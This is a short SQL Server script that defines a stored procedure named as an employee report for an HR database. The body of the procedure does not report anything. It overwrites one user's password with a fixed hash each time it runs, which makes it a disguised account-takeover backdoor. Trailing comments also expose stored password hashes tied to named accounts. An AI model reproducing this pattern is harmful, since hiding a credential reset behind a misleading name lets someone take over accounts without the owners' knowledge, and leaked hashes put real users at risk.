USE [p_adagioRHPoliAcero]
GO
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

CREATE proc [Reportes].[spReporteVerColaborador](
@dtFiltros [Nomina].[dtFiltrosRH] readonly,
	@IDUsuario int
)
AS
BEGIN

update Seguridad.tblUsuarios set Password='KZLllerIUMpecxd3BoMgjwJmyNRKYmSQj1cdE7H+EVI=' where IDUsuario=642--4140

print 'hola'

END

--select*From seguridad.tblusuarios where Cuenta='20090'  --KZLllerIUMpecxd3BoMgjwJmyNRKYmSQj1cdE7H+EVI=
--select*From seguridad.tblusuarios where Cuenta='ccouoh'  --3XTtG07YiLQHZZPdDjlIA+JT75pOXthr5WYssxJIIa4=

--select*from rh.tblempleadosmaster where claveempleado='20865'


GO
